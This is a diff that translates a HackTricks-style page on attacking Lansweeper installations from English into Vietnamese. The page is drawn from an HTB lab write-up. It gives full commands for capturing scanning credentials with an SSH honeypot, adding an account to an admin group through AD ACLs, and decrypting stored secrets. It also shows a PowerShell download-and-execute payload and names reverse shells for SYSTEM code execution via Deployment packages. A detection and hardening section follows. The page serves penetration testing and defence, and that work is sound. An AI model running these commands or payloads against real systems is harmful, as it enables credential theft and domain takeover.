@@ -1,30 +1,30 @@
-# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE
+# Lạm dụng Lansweeper: Thu thập thông tin xác thực, giải mã secrets và RCE qua triển khai
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Lansweeper is an IT asset discovery and inventory platform commonly deployed on Windows and integrated with Active Directory. Credentials configured in Lansweeper are used by its scanning engines to authenticate to assets over protocols like SSH, SMB/WMI and WinRM. Misconfigurations frequently allow:
+Lansweeper là nền tảng khám phá và kiểm kê tài sản CNTT, thường được triển khai trên Windows và tích hợp với Active Directory. Các thông tin xác thực được cấu hình trong Lansweeper được các công cụ quét sử dụng để xác thực với tài sản qua những giao thức như SSH, SMB/WMI và WinRM. Các cấu hình sai thường cho phép:
 
-- Credential interception by redirecting a scanning target to an attacker-controlled host (honeypot)
-- Abuse of AD ACLs exposed by Lansweeper-related groups to gain remote access
-- On-host decryption of Lansweeper-configured secrets (connection strings and stored scanning credentials)
-- Code execution on managed endpoints via the Deployment feature (often running as SYSTEM)
+- Chặn thông tin xác thực bằng cách chuyển hướng mục tiêu quét đến máy chủ do attacker kiểm soát (honeypot)
+- Lạm dụng ACL của AD được các nhóm liên quan đến Lansweeper để lộ nhằm giành quyền truy cập từ xa
+- Giải mã trực tiếp trên máy chủ các secrets được cấu hình trong Lansweeper (connection string và thông tin xác thực quét được lưu trữ)
+- Thực thi mã trên các endpoint được quản lý qua tính năng Deployment (thường chạy với quyền SYSTEM)
 
-This page summarizes practical attacker workflows and commands to abuse these behaviors during engagements.
+Trang này tóm tắt các quy trình và lệnh thực tế mà attacker có thể dùng để khai thác những hành vi này trong quá trình kiểm thử.
 
-## 1) Harvest scanning credentials via honeypot (SSH example)
+## 1) Thu thập thông tin xác thực quét qua honeypot (ví dụ SSH)
 
-Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.<sup>[[1]](#references)</sup>
+Ý tưởng: tạo Scanning Target trỏ đến máy chủ của bạn và ánh xạ Scanning Credentials hiện có vào đó. Khi quá trình quét chạy, Lansweeper sẽ thử xác thực bằng các thông tin xác thực đó, còn honeypot của bạn sẽ thu thập chúng.<sup>[[1]](#references)</sup>
 
-Steps overview (web UI):
+Tổng quan các bước (giao diện web):
 - Scanning → Scanning Targets → Add Scanning Target
-  - Type: IP Range (or Single IP) = your VPN IP
-  - Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
-  - Disable schedule and plan to trigger manually
-- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
-- Click “Scan now” on the target
-- Run an SSH honeypot and retrieve the attempted username/password
+  - Type: IP Range (hoặc Single IP) = IP VPN của bạn
+  - Cấu hình cổng SSH có thể truy cập được (ví dụ: 2022 nếu cổng 22 bị chặn)
+  - Tắt lịch quét và dự định kích hoạt thủ công
+- Scanning → Scanning Credentials → đảm bảo đã có thông tin xác thực Linux/SSH; ánh xạ chúng vào target mới (bật tất cả nếu cần)
+- Nhấp “Scan now” trên target
+- Chạy SSH honeypot và lấy username/password mà Lansweeper đã thử sử dụng
 
-Example with sshesame:<sup>[[2]](#references)</sup>
+Ví dụ với sshesame:<sup>[[2]](#references)</sup>
 
 ```yaml
 # sshesame.yaml
@@ -44,7 +44,7 @@ docker run --rm -it -p 2022:2022 \
 # connection with client version "SSH-2.0-RebexSSH_5.0.x" established
 ```
 
-Validate captured creds against DC services:
+Xác thực creds đã thu thập được với các dịch vụ DC:
 
 ```bash
 # SMB/LDAP/WinRM checks (NetExec)
@@ -53,20 +53,20 @@ netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
 
-Notes
-- Other protocols are not equivalent: an SMB/WinRM listener normally obtains an NTLM challenge-response rather than a cleartext password. Cracking or relaying it depends on the negotiated protocol protections; see [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). SSH password authentication is usually the simplest cleartext case.
-- SSH public-key authentication exposes the username and public-key fingerprint to the server, **not** the private key or its passphrase. Recover key-backed credentials from the compromised Lansweeper server instead of expecting a honeypot to disclose them.<sup>[[2]](#references)</sup>
-- Many scanners identify themselves with distinct client banners (e.g., RebexSSH) and will attempt benign commands (uname, whoami, etc.).
+Ghi chú
+- Các giao thức khác không tương đương: listener SMB/WinRM thường nhận được NTLM challenge-response thay vì mật khẩu dạng cleartext. Việc crack hoặc relay thông tin này phụ thuộc vào các cơ chế bảo vệ của giao thức đã thương lượng; xem [các cuộc tấn công đầu độc mạng và relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). Xác thực bằng mật khẩu SSH thường là trường hợp cleartext đơn giản nhất.
+- Xác thực bằng public key SSH để lộ username và fingerprint của public key cho server, **không phải** private key hoặc passphrase của nó. Hãy lấy lại thông tin xác thực dựa trên key từ server Lansweeper đã bị xâm nhập thay vì mong đợi honeypot tiết lộ chúng.<sup>[[2]](#references)</sup>
+- Nhiều scanner tự nhận diện bằng client banner riêng (ví dụ: RebexSSH) và sẽ thử chạy các lệnh vô hại (uname, whoami, v.v.).
 
-### Credential selection order matters
+### Thứ tự chọn thông tin xác thực rất quan trọng
 
-For a rescan, Lansweeper first retries the credential that last succeeded for that asset, then the explicitly mapped credentials in their configured order, and finally the global credential of the same type. A honeypot that accepts the first password authentication therefore normally will not observe later fallback credentials; during an authorized credential-path assessment, log and reject attempts if the objective is to verify the complete fallback sequence.<sup>[[6]](#references)</sup>
+Khi rescan, Lansweeper trước tiên thử lại thông tin xác thực đã thành công gần nhất cho asset đó, tiếp theo là các thông tin xác thực được ánh xạ tường minh theo thứ tự đã cấu hình, rồi cuối cùng là thông tin xác thực toàn cục cùng loại. Honeypot chấp nhận lần xác thực bằng mật khẩu đầu tiên thường sẽ không thấy các thông tin xác thực dự phòng được thử sau đó; trong quá trình đánh giá đường đi của thông tin xác thực được ủy quyền, hãy ghi log và từ chối các lần thử nếu mục tiêu là xác minh toàn bộ chuỗi dự phòng.<sup>[[6]](#references)</sup>
 
-## 2) AD ACL abuse: gain remote access by adding yourself to an app-admin group
+## 2) AD ACL abuse: giành quyền truy cập từ xa bằng cách thêm chính bạn vào nhóm app-admin
 
-Use BloodHound to enumerate effective rights from the compromised account. A common finding is a scanner- or app-specific group (e.g., “Lansweeper Discovery”) holding GenericAll over a privileged group (e.g., “Lansweeper Admins”). If the privileged group is also member of “Remote Management Users”, WinRM becomes available once we add ourselves.<sup>[[1]](#references)[[5]](#references)</sup>
+Dùng BloodHound để liệt kê các quyền hiệu lực của tài khoản đã bị xâm nhập. Một phát hiện phổ biến là nhóm dành riêng cho scanner hoặc ứng dụng (ví dụ: “Lansweeper Discovery”) có quyền GenericAll đối với một nhóm đặc quyền (ví dụ: “Lansweeper Admins”). Nếu nhóm đặc quyền cũng là thành viên của “Remote Management Users”, WinRM sẽ khả dụng sau khi chúng ta thêm chính mình vào nhóm đó.<sup>[[1]](#references)[[5]](#references)</sup>
 
-Collection examples:
+Ví dụ thu thập:
 
 ```bash
 # NetExec collection with LDAP
@@ -76,7 +76,7 @@ netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhoun
 rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
 ```
 
-Exploit GenericAll on group with BloodyAD (Linux):<sup>[[4]](#references)</sup>
+Exploit GenericAll trên nhóm bằng BloodyAD (Linux):<sup>[[4]](#references)</sup>
 
 ```bash
 # Add our user into the target group
@@ -87,28 +87,28 @@ bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<passwor
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
 
-Then get an interactive shell:
+Sau đó, mở shell tương tác:
 
 ```bash
 evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
 
-Tip: Kerberos operations are time-sensitive. If you hit KRB_AP_ERR_SKEW, sync to the DC first:
+Mẹo: Các thao tác Kerberos phụ thuộc vào thời gian. Nếu gặp lỗi KRB_AP_ERR_SKEW, hãy đồng bộ thời gian với DC trước:
 
 ```bash
 sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
 ```
 
-## 3) Decrypt Lansweeper-configured secrets on the host
+## 3) Giải mã các secret do Lansweeper cấu hình trên máy chủ
 
-On the Lansweeper server, the ASP.NET site typically stores an encrypted connection string and a symmetric key used by the application. With appropriate local access, you can decrypt the DB connection string and then extract stored scanning credentials.<sup>[[1]](#references)</sup>
+Trên máy chủ Lansweeper, trang ASP.NET thường lưu một chuỗi kết nối được mã hóa và một khóa đối xứng mà ứng dụng sử dụng. Với quyền truy cập cục bộ phù hợp, bạn có thể giải mã chuỗi kết nối DB rồi trích xuất thông tin xác thực quét đã lưu.<sup>[[1]](#references)</sup>
 
-Typical locations:
-- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
+Các vị trí thường gặp:
+- Cấu hình web: `C:\Program Files (x86)\Lansweeper\Website\web.config`
   - `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
-- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
+- Khóa ứng dụng: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
 
-Use SharpLansweeperDecrypt to automate decryption and dumping of stored creds. With no arguments, the current executable decrypts `web.config`, connects to the database and dumps all configured scanning credentials; `-e` also supports offline/manual decryption when an encrypted value and the key file are already available:<sup>[[3]](#references)</sup>
+Dùng SharpLansweeperDecrypt để tự động giải mã và trích xuất thông tin xác thực đã lưu. Khi không có tham số, tệp thực thi hiện tại sẽ giải mã `web.config`, kết nối với cơ sở dữ liệu và trích xuất tất cả thông tin xác thực quét đã cấu hình; `-e` cũng hỗ trợ giải mã ngoại tuyến/thủ công khi đã có sẵn giá trị được mã hóa và tệp khóa:<sup>[[3]](#references)</sup>
 
 ```powershell
 # Automatic: use the default web.config and Encryption.txt locations
@@ -122,14 +122,14 @@ Use SharpLansweeperDecrypt to automate decryption and dumping of stored creds. W
 powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
 ```
 
-Expected output includes DB connection details and plaintext scanning credentials such as Windows and Linux accounts used across the estate. These often have elevated local rights on domain hosts:
+Đầu ra dự kiến bao gồm thông tin kết nối DB và thông tin xác thực dạng plaintext của các tài khoản Windows và Linux được sử dụng trên toàn hệ thống. Những tài khoản này thường có quyền cục bộ nâng cao trên các máy chủ thuộc domain:
 
 ```text
 Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
 Inventory Linux    svc_inventory_lnx        <StrongPassword!>
 ```
 
-Use recovered Windows scanning creds for privileged access:
+Sử dụng creds quét Windows đã khôi phục để truy cập đặc quyền:
 
 ```bash
 netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
@@ -138,14 +138,14 @@ netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
 
 ## 4) Lansweeper Deployment → SYSTEM RCE
 
-As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Lansweeper uses an administrative scanning credential to reach the target's Task Scheduler and `C$`, then creates a task for the deployment. When the package uses the **System Account** run mode, the payload executes as `NT AUTHORITY\SYSTEM`; other run modes can use the mapped scanning credential or the currently logged-on user, so verify the selected mode rather than assuming SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>
+Là thành viên của “Lansweeper Admins”, bạn có thể truy cập Deployment và Configuration trên giao diện web. Trong Deployment → Deployment packages, bạn có thể tạo các package chạy lệnh tùy ý trên những asset được nhắm mục tiêu. Lansweeper dùng thông tin xác thực quét có quyền quản trị để truy cập Task Scheduler và `C$` trên mục tiêu, sau đó tạo một task cho deployment. Khi package sử dụng chế độ chạy **System Account**, payload sẽ chạy với quyền `NT AUTHORITY\SYSTEM`; các chế độ chạy khác có thể sử dụng thông tin xác thực quét đã ánh xạ hoặc người dùng hiện đang đăng nhập, vì vậy hãy xác minh chế độ đã chọn thay vì mặc định cho rằng đó là SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>
 
-High-level steps:
-- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
-- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
-- Catch your shell as SYSTEM.
+Các bước tổng quan:
+- Tạo Deployment package mới để chạy một lệnh PowerShell hoặc cmd (reverse shell, add-user, v.v.).
+- Chọn asset mong muốn (ví dụ: DC/host chạy Lansweeper) làm mục tiêu rồi nhấp Deploy/Run now.
+- Nhận shell với quyền SYSTEM.
 
-Example payloads (PowerShell):
+Payload mẫu (PowerShell):
 
 ```powershell
 # Simple test
@@ -156,35 +156,35 @@ powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http
 ```
 
 OPSEC
-- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Use judiciously.
+- Các hành động triển khai gây nhiều tiếng động và để lại log trong Lansweeper và Windows event logs. Hãy sử dụng một cách thận trọng.
 
-### Deployment artifacts and a second credential exposure point
+### Tạo tác vụ triển khai và một điểm lộ thông tin xác thực thứ hai
 
-The scanner writes its deployment executable under `C:\Windows\LSDeployment` through `C$`. Package files are normally read from `DefaultPackageShare$`, backed by `C:\Program Files (x86)\Lansweeper\PackageShare`, or from an IP-range-specific package share. Importantly, Lansweeper documents that the package-share credential is stored in **reversibly encrypted form in the registry of every computer receiving a deployment**. Treat a compromised managed endpoint as a potential disclosure point for that share account, and inspect the deployment directory, scheduled-task history and configured package shares when reconstructing Lansweeper activity.<sup>[[7]](#references)</sup>
+Scanner ghi executable triển khai vào `C:\Windows\LSDeployment` thông qua `C$`. Các tệp package thường được đọc từ `DefaultPackageShare$`, được lưu tại `C:\Program Files (x86)\Lansweeper\PackageShare`, hoặc từ package share dành riêng cho một dải IP. Điều quan trọng là Lansweeper ghi rõ thông tin xác thực của package share được lưu ở **dạng mã hóa có thể giải mã trong registry của mọi máy tính nhận triển khai**. Hãy xem endpoint được quản lý đã bị xâm nhập là một điểm có thể làm lộ tài khoản share đó, đồng thời kiểm tra thư mục triển khai, lịch sử scheduled task và các package share đã cấu hình khi tái dựng hoạt động của Lansweeper.<sup>[[7]](#references)</sup>
 
-## Detection and hardening
+## Phát hiện và tăng cường bảo mật
 
-- Restrict or remove anonymous SMB enumerations. Monitor for RID cycling and anomalous access to Lansweeper shares.
-- Egress controls: block or tightly restrict outbound SSH/SMB/WinRM from scanner hosts. Alert on non-standard ports (e.g., 2022) and unusual client banners like Rebex.
-- Protect `Website\\web.config` and `Key\\Encryption.txt`. Externalize secrets into a vault and rotate on exposure. Consider service accounts with minimal privileges and gMSA where viable.
-- AD monitoring: alert on changes to Lansweeper-related groups (e.g., “Lansweeper Admins”, “Remote Management Users”) and on ACL changes granting GenericAll/Write membership on privileged groups.
-- Audit Deployment package creations/changes/executions and correlate new remote scheduled tasks with writes to `C:\Windows\LSDeployment`; alert on packages spawning `cmd.exe`/`powershell.exe` or unexpected outbound connections.
-- Give package-share credentials only **Read & Execute** permission and never reuse them for administration. Prefer agent-based inventory where practical: if all computers are scanned by an agent and the deployment module is unused, Lansweeper does not require stored computer scanning credentials.<sup>[[6]](#references)[[7]](#references)</sup>
+- Hạn chế hoặc vô hiệu hóa việc liệt kê SMB ẩn danh. Giám sát RID cycling và hoạt động truy cập bất thường vào các share của Lansweeper.
+- Kiểm soát lưu lượng đi ra: chặn hoặc hạn chế nghiêm ngặt SSH/SMB/WinRM đi ra từ các host scanner. Cảnh báo khi phát hiện các cổng không phổ biến (ví dụ: 2022) và các client banner bất thường như Rebex.
+- Bảo vệ `Website\\web.config` và `Key\\Encryption.txt`. Chuyển secret sang vault và luân chuyển chúng khi bị lộ. Cân nhắc dùng service account với quyền tối thiểu và gMSA khi khả thi.
+- Giám sát AD: cảnh báo khi có thay đổi đối với các group liên quan đến Lansweeper (ví dụ: “Lansweeper Admins”, “Remote Management Users”) và khi có thay đổi ACL cấp quyền GenericAll/Write đối với membership của các group đặc quyền.
+- Kiểm tra việc tạo/thay đổi/thực thi package Deployment và đối chiếu scheduled task từ xa mới với các thao tác ghi vào `C:\Windows\LSDeployment`; cảnh báo khi package khởi chạy `cmd.exe`/`powershell.exe` hoặc tạo kết nối đi ra bất thường.
+- Chỉ cấp cho thông tin xác thực package share quyền **Read & Execute** và tuyệt đối không dùng lại chúng cho mục đích quản trị. Khi khả thi, ưu tiên kiểm kê dựa trên agent: nếu tất cả máy tính đều được quét bằng agent và không sử dụng module deployment, Lansweeper không yêu cầu lưu thông tin xác thực quét máy tính.<sup>[[6]](#references)[[7]](#references)</sup>
 
-## Related topics
-- [SMB/LSA/SAMR enumeration and RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
-- [Kerberos authentication and clock-skew considerations](kerberos-authentication.md)
-- [BloodHound path analysis](bloodhound.md)
-- [WinRM usage and lateral movement](../lateral-movement/winrm.md)
+## Chủ đề liên quan
+- [Liệt kê SMB/LSA/SAMR và RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
+- [Xác thực Kerberos và các lưu ý về clock-skew](kerberos-authentication.md)
+- [Phân tích đường dẫn BloodHound](bloodhound.md)
+- [Sử dụng WinRM và di chuyển ngang](../lateral-movement/winrm.md)
 
 
 
 ## References
-- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
+- [1] [HTB: Sweep — Khai thác Lansweeper Scanning, AD ACL và secret để chiếm quyền Domain Controller (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
 - [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
 - [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
 - [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
 - [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
-- [6] [Create and map scanning credentials — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
-- [7] [Deployment requirements — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
+- [6] [Tạo và ánh xạ thông tin xác thực quét — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
+- [7] [Yêu cầu triển khai — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
 {{#include ../../banners/hacktricks-training.md}}
